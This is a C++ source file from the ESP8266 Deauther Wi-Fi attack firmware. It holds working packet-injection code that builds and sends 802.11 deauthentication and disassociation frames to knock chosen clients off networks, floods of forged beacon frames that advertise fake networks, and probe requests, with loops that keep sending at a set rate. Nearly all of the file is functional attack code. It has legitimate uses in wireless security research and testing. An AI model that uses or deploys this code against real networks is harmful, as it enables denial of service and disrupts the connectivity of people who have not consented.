/*
   Copyright (c) 2020 Stefan Kremser
   This software is licensed under the MIT License. See the license file for details.
   Source: github.com/spacehuhn/esp8266_deauther
 */

#include "attack.h"

#include "debug.h"
#include "cli.h"
#include "strh.h"

// ========== Packet Injection Functions ========== //
extern "C" {
    #include "user_interface.h"
    typedef void (* freedom_outside_cb_t)(uint8 status);
    int wifi_register_send_pkt_freedom_cb(freedom_outside_cb_t cb);
    void wifi_unregister_send_pkt_freedom_cb(void);
    int wifi_send_pkt_freedom(uint8* buf, int len, bool sys_seq);
}

// ========== DEAUTH ========== //
uint8_t deauth_data[] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // Type, subtype: c0 => deauth, a0 => disassociate
    /*  2 - 3  */ 0x00, 0x00,                         // Duration (handled by the SDK)
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Reciever MAC (To)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Source MAC (From)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID MAC (From)
    /* 22 - 23 */ 0x00, 0x00,                         // Fragment & squence number
    /* 24 - 25 */ 0x01, 0x00                          // Reason code (1 = unspecified reason)
};

// ========== BEACON ========== //
uint8_t beacon_data[] = {
    // [22]
    /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00,                         // Type/Subtype: managment beacon frame
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // Destination MAC
    /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,             // Source MAC
    /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,             // Source MAC

    // Fixed parameters [14]
    /* 22 - 23 */ 0x00, 0x00,                                     // Fragment & sequence number (handled by the SDK)
    /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
    /* 32 - 33 */ 0xe8, 0x03,                                     // Interval: [0x64, 0x00] => 100ms, [0xe8, 0x03] => 1s
    /* 34 - 35 */ 0x31, 0x00,                                     // Capabilities Tnformation 0x21 = OPEN, 0x31 = ENCRYPTED

    // Tagged parameters

    // SSID parameters [2+ssid]
    /* 36 - 37 */ 0x00, 0x20,             // Tag: Set SSID length, Tag length: 32
    /* 38 -    */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*    - 69 */ 0x00, 0x00, 0x00, 0x00, // SSID

    // Supported Rates [10]
    /* 70 - 71 */ 0x01, 0x08,             // Tag: Supported Rates, Tag length: 8
    /*    72   */ 0x82,                   // 1(B)
    /*    73   */ 0x84,                   // 2(B)
    /*    74   */ 0x8b,                   // 5.5(B)
    /*    75   */ 0x96,                   // 11(B)
    /*    76   */ 0x24,                   // 18
    /*    77   */ 0x30,                   // 24
    /*    78   */ 0x48,                   // 36
    /*    79   */ 0x6c,                   // 54

    // Current Channel [3]
    /* 80 - 81 */ 0x03, 0x01,             // Channel set, length
    /*    82   */ 0x01,                   // Current Channel

    // RSN information
    /* 83 - 84 */ 0x30, 0x18,
    /* 85 - 86 */ 0x01, 0x00,
    /* 87 - 90 */ 0x00, 0x0f, 0xac, 0x02,
    /* 91 - 92 */ 0x02, 0x00,
    /* 93 -100 */ 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
    /*101 -102 */ 0x01, 0x00,
    /*103 -106 */ 0x00, 0x0f, 0xac, 0x02,
    /*107 -108 */ 0x00, 0x00
};

uint8_t probe_data[] = {
    /*  0 - 1  */ 0x40, 0x00,                         // Type: Probe Request
    /*  2 - 3  */ 0x00, 0x00,                         // Duration: 0 microseconds
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
    /* 10 - 15 */ 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, // Source: random MAC
    /* 16 - 21 */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // BSS Id: Broadcast
    /* 22 - 23 */ 0x00, 0x00,                         // Sequence number (handled by the SDK)
    /* 24 - 25 */ 0x00, 0x20,                         // Tag: Set SSID length, Tag length: 32
    /* 26 -    */ 0x00, 0x00, 0x00, 0x00,             // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00,             // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00,             // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00,             // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00,             // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00,             // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00,             // SSID
    /*    - 57 */ 0x00, 0x00, 0x00, 0x00,             // SSID
    /* 58 - 59 */ 0x01, 0x08,                         // Tag Number: Supported Rates (1), Tag length: 8
    /*    60   */ 0x82,                               // 1(B)
    /*    61   */ 0x84,                               // 2(B)
    /*    62   */ 0x8b,                               // 5.5(B)
    /*    63   */ 0x96,                               // 11(B)
    /*    64   */ 0x24,                               // 18
    /*    65   */ 0x30,                               // 24
    /*    66   */ 0x48,                               // 36
    /*    67   */ 0x6c                                // 54
};


namespace packetinjector {
    bool send(uint8_t ch, uint8_t* buf, uint16_t len) {
        wifi_set_channel(ch);
        return wifi_send_pkt_freedom(buf, len, 0) == 0;
    }

    bool send_deauth(uint8_t ch, uint8_t* from, uint8_t* to) {
        deauth_data[0] = 0xc0;
        memcpy(&deauth_data[10], from, 6);
        memcpy(&deauth_data[16], from, 6);
        memcpy(&deauth_data[4], to, 6);
        return send(ch, deauth_data, sizeof(deauth_data));
    }

    bool send_disassoc(uint8_t ch, uint8_t* from, uint8_t* to) {
        deauth_data[0] = 0xa0;
        memcpy(&deauth_data[10], from, 6);
        memcpy(&deauth_data[16], from, 6);
        memcpy(&deauth_data[4], to, 6);
        return send(ch, deauth_data, sizeof(deauth_data));
    }

    bool send_beacon(uint8_t ch, uint8_t* from, uint8_t* to, const char* ssid, int enc) {
        size_t ssid_len = strlen(ssid);

        if (ssid_len > 32) ssid_len = 32;
        uint16_t pkt_len = 0;

        uint8_t frame[109];

        // MAC header
        memcpy(&frame[0], &beacon_data[0], 4);
        memcpy(&frame[4], to, 6);
        memcpy(&frame[10], from, 6);
        memcpy(&frame[16], from, 6);
        pkt_len += 4 + 6 + 6 + 6;

        // Fixed parameters
        memcpy(&frame[22], &beacon_data[22], 14);
        pkt_len += 14;

        // SSID
        frame[pkt_len]   = 0x00;
        frame[pkt_len+1] = ssid_len;
        memcpy(&frame[pkt_len+2], ssid, ssid_len);
        pkt_len += 2 + ssid_len;

        // Supported Rates
        memcpy(&frame[pkt_len], &beacon_data[70], 10);
        pkt_len += 10;

        // Channel
        memcpy(&frame[pkt_len], &beacon_data[80], 2);
        frame[pkt_len] = ch;
        pkt_len       += 2 + 1;

        // RSN
        switch (enc) {
            case ENCRYPTION_OPEN:
                frame[34] = 0x21;
                return send(ch, frame, pkt_len);
            case ENCRYPTION_WPA2:
                frame[34] = 0x31;

                memcpy(&frame[pkt_len], &beacon_data[83], 26);
                pkt_len += 26;

                return send(ch, frame, pkt_len);
            default:
                return false;
        }
    }

    bool send_probe(uint8_t ch, uint8_t* from, const char* ssid) {
        memcpy(&probe_data[10], from, 6);
        // beacon_data[25] = strlen(ssid);
        memset(&probe_data[26], 0, 32);
        return send(ch, probe_data, sizeof(probe_data));
    }
}

namespace attack {
    // ========== Target =========== //
    typedef struct target_t {
        uint8_t   from[6];
        uint8_t   to[6];
        uint8_t   ch;
        target_t* next;
    } target_t;

    Target::Target(target_t* ptr) {
        this->ptr = ptr;
    }

    uint8_t* Target::from() const {
        if (ptr) return ptr->from;
        else return NULL;
    }

    uint8_t* Target::to() const {
        if (ptr) return ptr->to;
        else return NULL;
    }

    uint8_t Target::ch() const {
        if (ptr) return ptr->ch;
        else return 0;
    }

    bool Target::operator==(const Target& t) const {
        if (ptr == t.ptr) return true;
        if (!ptr) return false;

        return memcmp(from(), t.from(), 6) == 0 &&
               memcmp(to(), t.to(), 6) == 0 &&
               ch() == t.ch();
    }

    // ========== TargetList =========== //
    TargetList::~TargetList() {
        h = list_begin;

        while (h) {
            target_t* to_delete = h;
            h = h->next;
            free(to_delete);
        }

        list_begin = NULL;
        list_end   = NULL;
        list_size  = 0;

        h = NULL;
    }

    void TargetList::push(const uint8_t* from, const uint8_t* to, const uint8_t ch) {
        // Create new target
        target_t* new_target = (target_t*)malloc(sizeof(target_t));

        memcpy(new_target->from, from, 6);
        memcpy(new_target->to, to, 6);
        new_target->ch   = ch;
        new_target->next = NULL;

        // Check if already in list
        Target t(new_target);

        target_t* h = list_begin;

        while (h) {
            if (Target(h) == t) {
                free(new_target);
                return;
            }
            h = h->next;
        }

        // Push to list
        if (!list_begin) {
            list_begin = new_target;
            list_end   = new_target;
            h          = list_begin;
        } else {
            list_end->next = new_target;
            list_end       = new_target;
        }

        ++(list_size);
    }

    Target TargetList::get(int i) {
        h = list_begin;
        int j = 0;

        while (h && i<j) {
            h = h->next;
            ++j;
        }

        return Target(h);
    }

    void TargetList::begin() {
        h = list_begin;
    }

    Target TargetList::iterate() {
        Target t(h);

        if (h) {
            h = h->next;
        }

        return t;
    }

    bool TargetList::available() {
        return h;
    }

    int TargetList::size() {
        return list_size;
    }

    // ========== Attacks =========== //
    void beacon(StringList& ssid_list, uint8_t* from, uint8_t* to, int enc, uint8_t ch, unsigned long timeout) {
        { // Error checks
            if (ssid_list.size() == 0) {
                debugln("ERROR: No SSIDs specified");
                return;
            }

            if (!from || !to) {
                debugln("ERROR: MAC address not specified");
                return;
            }

            if ((ch < 1) || (ch > 14)) {
                debugln("ERROR: Invalid channel");
                return;
            }
        }

        { // Output
            debug("Sending beacons from ");
            debug(strh::mac(from));
            debug(" to ");
            debug(strh::mac(to));
            debug(" on channel ");
            debugln(ch);

            debug("Encryption: ");

            switch (enc) {
                case ENCRYPTION_OPEN:
                    debugln("none");
                    break;
                case ENCRYPTION_WPA2:
                    debugln("WPA2");
                    break;
            }

            debugln("SSIDs:");

            while (ssid_list.available()) {
                debugln(ssid_list.iterate());
            }

            if (timeout > 0) {
                debug("Stop after ");
                debug(timeout/1000);
                debugln(" seconds");
            }
            debugln("Type 'stop' or 'exit' to stop the attack");
        }

        uint8_t last_byte = from[5];

        unsigned long start_time  = millis();
        unsigned long output_time = millis();

        unsigned long pkts_sent       = 0;
        unsigned long pkts_per_second = 0;

        unsigned long pkt_time     = millis();
        unsigned long pkt_interval = 100;

        bool running = true;

        while (running) {
            if (millis() - pkt_time >= pkt_interval) {
                pkt_time = millis();
                ssid_list.begin();

                for (int i = 0; running && i<ssid_list.size(); ++i) {
                    from[5] = last_byte + i;

                    String ssid = ssid_list.iterate();

                    pkts_per_second += packetinjector::send_beacon(ch, from, to, ssid.c_str(), enc);
                    delay(1);

                    running = !(cli::read_exit() || (timeout > 0 && millis() - start_time > timeout));
                }
            }

            if (millis() - output_time >= 1000) {
                pkts_sent += pkts_per_second;

                debug(pkts_per_second);
                debug(" pkts/s, ");
                debug(pkts_sent);
                debugln(" sent ");

                output_time = millis();

                pkts_per_second = 0;
            }
        }

        debugln("Beacon attack stopped");
    }

    void deauth(TargetList& targets, bool deauth, bool disassoc, unsigned long rate, unsigned long timeout, unsigned long pkts) {
        { // Error checks
            if (targets.size() == 0) {
                debugln("ERROR: No targets specified");
                return;
            }
            if (!deauth && !disassoc) {
                debugln("ERROR: Invalid mode");
                return;
            }
        }

        { // Output
            if (deauth && disassoc) {
                debug("Deauthing and disassociating ");
            } else if (deauth) {
                debug("Deauthing ");
            } else if (disassoc) {
                debug("Disassociating ");
            }

            debug(targets.size());
            debugln(" targets:");

            // Print MACs
            targets.begin();

            while (targets.available()) {
                Target t = targets.iterate();
                debug("- From ");
                debug(strh::mac(t.from()));
                debug(" to ");
                debug(strh::mac(t.to()));
                debug(" on channel ");
                debugln(t.ch());
            }

            debug("With ");
            debug(rate);
            debugln(" packets per second");

            if (timeout > 0) {
                debug("Stop after ");
                debug(timeout/1000);
                debugln(" seconds");
            }

            if (pkts > 0) {
                debug("Stop after ");
                debug(pkts);
                debugln(" packets");
            }

            debugln("Type 'stop' or 'exit' to stop the attack");
        }

        unsigned long start_time  = millis();
        unsigned long output_time = millis();

        unsigned long pkts_sent       = 0;
        unsigned long pkts_per_second = 0;
        unsigned long pkt_time        = 0;
        unsigned long pkt_interval    = (1000/rate) * (deauth+disassoc);

        bool running = true;

        while (running) {
            targets.begin();

            while (running && targets.available()) {
                if (millis() - pkt_time >= pkt_interval) {
                    Target t = targets.iterate();

                    if (deauth) pkts_per_second += packetinjector::send_deauth(t.ch(), t.from(), t.to());
                    if (disassoc) pkts_per_second += packetinjector::send_disassoc(t.ch(), t.from(), t.to());

                    pkt_time = millis();
                }
                if (millis() - output_time >= 1000) {
                    pkts_sent += pkts_per_second;

                    debug(pkts_per_second);
                    debug(" pkts/s, ");
                    debug(pkts_sent);
                    debugln(" sent");

                    output_time = millis();

                    pkts_per_second = 0;
                }
                running = !(cli::read_exit()
                            || (timeout > 0 && millis() - start_time > timeout)
                            || (pkts > 0 && pkts_sent > pkts));
            }
        }
    }
}